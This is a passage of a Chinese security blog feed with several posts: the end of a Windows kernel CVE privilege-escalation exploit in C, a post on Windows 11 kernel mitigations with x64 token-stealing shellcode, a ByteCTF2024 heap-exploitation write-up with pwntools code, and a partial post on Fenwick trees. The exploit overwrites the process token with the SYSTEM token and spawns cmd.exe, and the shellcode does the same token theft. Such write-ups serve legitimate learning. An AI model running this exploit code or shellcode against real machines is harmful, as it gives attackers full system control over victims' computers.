L&quot;\\Device\\Mup\\;Csc\\.\\.&quot;);</span></span><br><span class="line">pRtlInitUnicodeString(&amp;objectName, <span class="string">L&quot;\\Device\\n0000b&quot;</span>);</span><br><span class="line">InitializeObjectAttributes(&amp;objectAttr, &amp;objectName, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">status = pNtCreateFile(&amp;handle, SYNCHRONIZE, &amp;objectAttr, &amp;iosb, <span class="literal">NULL</span>, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtCreateFile failed with status = %x\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ret = GetObjPtr(&amp;Sysproc, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address = %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line">hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curthread, GetCurrentProcessId(), hThread);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current THREAD address = %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());</span><br><span class="line"><span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curproc, GetCurrentProcessId(), hCurproc);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address = %llx\n&quot;</span>, Curproc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//DbgBreak();</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">char</span>* write_to = (<span class="type">char</span>*)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET);</span><br><span class="line"></span><br><span class="line"><span class="comment">//status = pNtFsControlFile(handle, NULL, NULL, NULL, &amp;iosb, CSC_DEV_FCB_XXX_CONTROL_FILE,</span></span><br><span class="line"><span class="comment">///*Vuln arg*/ (void*)(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET-0x18), 0, NULL, 0);</span></span><br><span class="line"><span class="comment">//__debugbreak();</span></span><br><span class="line">offset.QuadPart = <span class="number">0x223450</span>;</span><br><span class="line"><span class="keyword">if</span> (!SetFilePointerEx(handle, offset, <span class="literal">NULL</span>, FILE_BEGIN)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] SetFilePointerEx failed with error %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line"><span class="comment">//DebugBreak();</span></span><br><span class="line"><span class="comment">//SendIoctl(handle, NULL, &amp;write_to, 0x1);</span></span><br><span class="line">__int64 buffer[<span class="number">2</span>];</span><br><span class="line">buffer[<span class="number">0</span>] = (Curthread + KTHREAD_PREVIOUS_MODE_OFFSET);</span><br><span class="line">BOOL result = DeviceIoControl(</span><br><span class="line">handle,</span><br><span class="line"><span class="number">0x223450</span>,</span><br><span class="line">buffer,</span><br><span class="line"><span class="number">0x8</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">&amp;bytesReturned,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//BOOL result = ReadFile(handle,buffer,sizeof(buffer), &amp;bytesReturned, NULL);</span></span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Fail ioctl!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//if (!NT_SUCCESS(status))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;[-] NtFsControlFile failed with status = %x\n&quot;, status);</span></span><br><span class="line"><span class="comment">//return status;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;[!] Leveraging DKOM to achieve LPE\n&quot;);</span></span><br><span class="line"><span class="comment">//printf(&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;);</span></span><br><span class="line"></span><br><span class="line">Write64(Curproc + EPROCESS_TOKEN_OFFSET, Sysproc + EPROCESS_TOKEN_OFFSET, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">Write64(Curthread + KTHREAD_PREVIOUS_MODE_OFFSET, &amp;mode, <span class="number">0x1</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (NtLoad()) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">NTSTATUS status = Exploit();</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/success_bsod.png" alt="success_bsod.png"></p><h1>总结</h1><p>年轻人的第一个Windows内核CVE（也是第一个CVE）复现，即便是这种生产环境高危的漏洞，本质逻辑也就是那样。只是在发现读写原语（read/write primitive）利用点的区别，提权路径也就是那些了，最后都得偷token，linux都得commit_cred。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://www.youtube.com/watch?v=nauAlHXrkIk&quot;&gt;https://www.youtube.com/watch?v=nauAlHXrkIk&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>现代内核安全机制——以Windows 11的kernel pwn为例</title>
    <link href="http://example.com/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/"/>
    <id>http://example.com/2024/10/06/%E7%8E%B0%E4%BB%A3%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E4%BB%A5Windows-11%E7%9A%84kernel-pwn%E4%B8%BA%E4%BE%8B/</id>
    <published>2024-10-06T08:31:08.000Z</published>
    <updated>2024-10-09T13:04:18.758Z</updated>
    
    <content type="html"><![CDATA[<h1>DEP</h1><p>全称Data Execution Prevention，看名字来讲就大概是说在数据区不允许执行。也就是经典的可写不可执行可执行的不可写的保护策略。我们能ret2sc执行我们自己的代码就是因为写入的数据和执行的代码没有隔离，dep就是为了阻止这一点。</p><h1>HVCI和VBS</h1><p>HVCI全称Hypervisor-protected Code Integrity（基于虚拟化保护的代码完整性检查），同样是将内存页可写与可执行分离，但对于DEP我们能够显式的通过一些手段让栈能够执行，通过修改某些标记？但hvci防止了这一点。修改内存页</p><h1>提权和恶搞</h1><p>我们Windows非常贴心的提供了API来泄露内核地址。这些函数相当一部分是“非公开函数”<br>不过说是非公开，只是我们无法通过<code>#include &lt;xxx.h&gt;</code>的方式进行引入而已。通过运行时加载或者extern声明的形式，我们可以从ntdll中获取这些函数，包括<code>NtQuerySystemInformation</code>这种能够无漏洞拿内核地址的以及<code>NtWriteVirtualMemory</code>这种任意地址写入的…Windows给的api太厉害以致于kaslr看起来似乎都没什么用了</p><p>Windows中，类似于task_struct，进程也是被结构体链表管理的。在内核中由一个EPROCESS管理每个进程。而除了pid，windows判断权限的方法主要是一个token。我们提权就是要从pid4（system权限固定进程，处理系统调用等）把token偷出来。否则内核是不让我们乱写的，用户态的写入会被大量的检查。</p><h1>内核ShellCode？</h1><blockquote><p>Windows的系统调用号是非公开的。</p></blockquote><p>shellcode也就是偷token了。即通过定位当前进程的ap链表项，通过循环遍历找到pid4的内核进程，然后偷取它的token复制到我们自己的进程，就有了系统权限。这是一段非常经典的windows内核shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[BITS 64]</span><br><span class="line">_start:</span><br><span class="line">    mov rax, [gs:0x188]     ;Cur thread(KTHREAD)</span><br><span class="line">    mov rax, [rax+0xb8]     ;Cur process(EPROCESS)</span><br><span class="line">    mov rbx, rax            ;Copy</span><br><span class="line">__loop:</span><br><span class="line">    mov rbx, [rbx + 0x448]  ;ActiveProcessLinks</span><br><span class="line">    sub rbx, 0x2e8          ;Go back to cur process (EPROCESS)</span><br><span class="line">    mov rcx, [rbx + 0x440]  ;UniqueProcessID(PID)</span><br><span class="line">    cmp rcx, 4              ;is System?</span><br><span class="line">    jnz __loop</span><br><span class="line">    mov rcx, [rbx + 0x4b8]  ;Token is at offset _EPROCESS + 0x4b8</span><br><span class="line">    and cl, 0xf0            ;Clear out _EX_FAST_REF RefCnt</span><br><span class="line">    mov [rax + 0x4b8], rcx  ;copy 2 cur</span><br><span class="line">    xor rax, rax            ;STATUS_SUCCESS</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;DEP&lt;/h1&gt;
&lt;p&gt;全称Data Execution Prevention，看名字来讲就大概是说在数据区不允许执行。也就是经典的可写不可执行可执行的不可写的保护策略。我们能ret2sc执行我们自己的代码就是因为写入的数据和执行的代码没有隔离，dep就是为了阻止这一点。</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="kernel" scheme="http://example.com/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2024——ezheap</title>
    <link href="http://example.com/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/"/>
    <id>http://example.com/2024/09/25/ByteCTF2024%E2%80%94%E2%80%94ezheap/</id>
    <published>2024-09-24T16:57:28.000Z</published>
    <updated>2024-09-26T01:21:29.160Z</updated>
    
    <content type="html"><![CDATA[<p>这道题目比赛的时候思路卡住了，有两个其实很简单的点都没想到，不然初赛战队就能第三名拿钱了。</p><h1>题目分析</h1><p>GLIBC2.27，符号表都没去，就是add，edit，show，delete，exit。malloc返回的指针存在数组里。漏洞明显的不能再明显了，add申请一个size，edit没检查，任意溢出。然后show就是printf %s的泄露，exit调用了libc中的exit函数。</p><p>但是这个free比较幽默，是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">freechunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 temp; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 tempa; <span class="comment">// [rsp+Fh] [rbp-181h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ia; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ib; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> ic; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> id; <span class="comment">// [rsp+10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  <span class="type">int</span> ja; <span class="comment">// [rsp+14h] [rbp-17Ch]</span></span><br><span class="line">  <span class="type">size_t</span> index; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 output[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 input[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 S[<span class="number">264</span>]; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+178h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)i &lt; <span class="number">0x20</span>; ++i )</span><br><span class="line">    input[i] = i;</span><br><span class="line">  <span class="keyword">for</span> ( ia = <span class="number">0</span>; ia &lt;= <span class="number">255</span>; ++ia )</span><br><span class="line">    S[ia] = ia;</span><br><span class="line">  <span class="keyword">for</span> ( ib = <span class="number">0</span>; ib &lt;= <span class="number">255</span>; ++ib )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = S[ib] + j;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;secretkey&quot;</span>);</span><br><span class="line">    v2 = v0 + aSecretkey[ib % v1];</span><br><span class="line">    LODWORD(v1) = (<span class="type">unsigned</span> <span class="type">int</span>)((v0 + (<span class="type">unsigned</span> __int8)aSecretkey[ib % v1]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    j = (<span class="type">unsigned</span> __int8)(v1 + v2) - (_DWORD)v1;</span><br><span class="line">    temp = S[ib];</span><br><span class="line">    S[ib] = S[j];</span><br><span class="line">    S[j] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  ic = <span class="number">0</span>;</span><br><span class="line">  ja = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0LL</span>; index &lt; <span class="number">0x20</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    ic = (ic + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    ja = (ja + S[ic]) % <span class="number">256</span>;</span><br><span class="line">    tempa = S[ic];</span><br><span class="line">    S[ic] = S[ja];</span><br><span class="line">    S[ja] = tempa;</span><br><span class="line">    output[index] = S[(<span class="type">unsigned</span> __int8)(S[ic] + S[ja])] ^ input[index];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( id = <span class="number">0</span>; (<span class="type">unsigned</span> __int64)id &lt; <span class="number">0x20</span>; ++id )</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>稍微看一下就能发现，这个free乱搞了半天完全是自己忙活自己的，所有内容都是函数的局部变量，input都是自己初始化的，问了copilot说这是个rc4的加密算法，不过没什么用就是了。再观察一下就能发现程序根本就没链接到free，没有free的符号。调的库就puts，这里面的strlen还有malloc。</p><p>除了没有free以外，edit有个很有意思的地方。在edit之前，会检查这个chunk指针的地址。定位一下可以知道，这两个地址分别检查了mallochook以及前面的0x3000和linkmap中的两个&quot;exithook&quot;，即在exit的时候会触发的两个函数指针。（发现mallochook不能用就第一时间上网找利用方式就看到了这个，结果也ban了…）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">checksanbox</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptr &gt;= (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x368270</span> &amp;&amp; ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x36B270</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr &gt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x5995B2</span> || ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x599596</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个伏笔↑，后面会说</p></blockquote><h1>没有free我们怎么做？</h1><p>首先没有free一定是houseoforange的前半步了，glibc2.27 ban了House of Orange的后半段，但不影响拿free块。同时在unsortedbin之后再切割就能拿libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">evil_size=<span class="number">0xd91</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(evil_size))</span><br><span class="line">add(<span class="number">0xe08</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 2 size for free: 0xd71</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Chunk at index 2: &#x27;</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3ebca0</span>-<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>这道题虽然不用，但是还有一个重要的点是，这里**一块就能泄露libc和堆地址了。**比赛的时候试着打堆地址有0截断出不来，但是其实有个关键细节想错了，就是这个用orange拿到的堆块并不更新lastremainder，它没有被切过，此时lastremainder是0，也就是说分配0x1000这个largechunk之前会跑一次循环，把这个堆块放进largebin！也就是说这个块里面会同时有我们的堆和libc地址，申请出来的可控chunk也是都有的，只需要泄露libc后将fd和bk填充上再泄露就不会0截断了，把fdnextsize打出来就有heap地址了。</p><h2 id="第二步呢？">第二步呢？</h2><p>orange只能给我们一个free堆块，常规手段应该就到这了，比赛就卡在这里。按学长和WM的wp走的话这里有两种思路：</p><ol><li class="lvl-3"><p>复读！</p></li><li class="lvl-3"><p>House of Force</p></li></ol><p>先来说第一种，这道题是任意溢出，完全不检查，因此我们申请出的第二个0xe10的chunk应该是新的top切下来的，那我们从这溢出新的top再free不就有新的堆块了？而且这个堆块的size我们可以任意控制，由于没有free我们不好构造fakechunk进行操作，最好的办法肯定是劫持到tcache，因此把size改到最小的对齐然后拿到tcache，2.27的tcache基本是四处漏风：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0xe10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe08</span>+p64(<span class="number">0x1f1</span>))</span><br><span class="line">add(<span class="number">0xe00</span>) <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># hijack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0xe18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe08</span>+p64(<span class="number">0x1d1</span>)+p64(malloc_hook))</span><br><span class="line"><span class="comment"># --------</span></span><br><span class="line">add(<span class="number">0x1c8</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x1c8</span>) <span class="comment"># 5 &lt;- arbitrary alloc</span></span><br></pre></td></tr></table></figure><p>然后第二种，目前不清楚有没有什么限制，没有的话看wp的步骤也是一种很好用的方法，是利用整数溢出的houseofforce把top抬高到我们想要的位置。当然这道题要想任意地址分配的话还是得走tcache，这里拿到tcache perthread struct的控制权然后随便找个合适的size写入也能达到任意地址分配的目的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xB60</span>)<span class="comment"># 3 取走bin里的chunk</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment"># 4 新top切割的</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x110</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span> + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)) <span class="comment"># House of Force</span></span><br><span class="line">add(-<span class="number">0x22130</span>)<span class="comment"># 5 整数溢出把top推到堆起始地址</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span> + p64(libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])</span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment"># 6这个堆块在开头，用来劫持tcache perthread struct</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x110</span>, payload) <span class="comment"># 在tcache[size=0x190]的位置写入了__malloc_hook</span></span><br><span class="line">add(<span class="number">0x190</span>)<span class="comment"># 7 申请出来 </span></span><br></pre></td></tr></table></figure><h1>下一步…</h1><p>最幽默的一集来了，回收伏笔：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">checksanbox</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;                                      <span class="comment">/*here ↓*/</span></span><br><span class="line">  <span class="keyword">if</span> ( ptr &gt;= (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x368270</span> &amp;&amp; ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x36B270</span> ) <span class="comment">//注意这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr &gt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x5995B2</span> || ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x599596</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这个malloc，他妈的他这边在mallochook这没有等号！也就是说只要返回的指针恰好是mallochook就没问题了。。。tcache里面直接写mallochook然后返回写入onegadget直接getshell</p><p>这里比赛当天还尝试在mainarena附近用house of lore打chunklist，看来想多了，确实是ezheap。这下知道house of orange的妙用了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题目比赛的时候思路卡住了，有两个其实很简单的点都没想到，不然初赛战队就能第三名拿钱了。&lt;/p&gt;
&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;GLIBC2.27，符号表都没去，就是add，edit，show，delete，exit。malloc返回的指针存在数组里。漏洞明显的不能再</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(2)</title>
    <link href="http://example.com/2024/09/24/Algorithm-2/"/>
    <id>http://example.com/2024/09/24/Algorithm-2/</id>
    <published>2024-09-24T04:35:46.000Z</published>
    <updated>2024-12-02T09:16:21.588Z</updated>
    
    <content type="html"><![CDATA[<h1></h1><h1>树状数组</h1><div class="tips"><p>是线段树的子集。也就是说他能干的线段树都能干，它干不了的线段树也能干。只是这个结构在空间上优化很大，不需要额外空间就能实现。同时编程也靠lowbit大大简化</p></div><h2 id="解决什么问题？">解决什么问题？</h2><p>单点修改，区间查询混合，将平均复杂度降到$O(logn)$</p><p>考虑两个极端，修改时间度</p><h2 id="内容">内容</h2><p>把n个元素的数组重新组织一下（树操作，不要0下标），奇数还是存自己，偶数存某种前缀和。这个“某种”采用一个独特的方式计算：<code>lowbit</code>——即当前下标二进制表示，从右向左第一个1以及其右边所有0所代表的数。</p><p>而lowbit的代码实现也是它速度快的一个保障：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> lowbit(x) ((x)&amp;(-x))</span></span><br><span class="line"><span class="comment">// start idx:</span></span><br><span class="line"><span class="type">int</span> start_idx = i - <span class="built_in">lowbit</span>(i) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>原本数组下标i的元素被放在了树状数组的哪里？我们采用如下计算方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[i] in c[i],c[i=i+(<span class="built_in">lowbit</span>(i))],c[i=i+(<span class="built_in">lowbit</span>(i))]...</span><br></pre></td></tr></table></figure><h2 id="操作">操作</h2><h3 id="建立">建立</h3><h3 id="更新">更新</h3><p>这个操作的具体实现取决于功能。查区间和就<code>+</code>，乘积就乘。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        c[i] += data;<span class="comment">// modify</span></span><br><span class="line">        i+=<span class="built_in">lowbit</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查询">查询</h3><p>反过来，和前缀和数组的下标转化靠的是减去<code>lowbit(i)</code>查询从1到i的和：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> s=<span class="number">0</span>;</span><br><span class="line">    <span 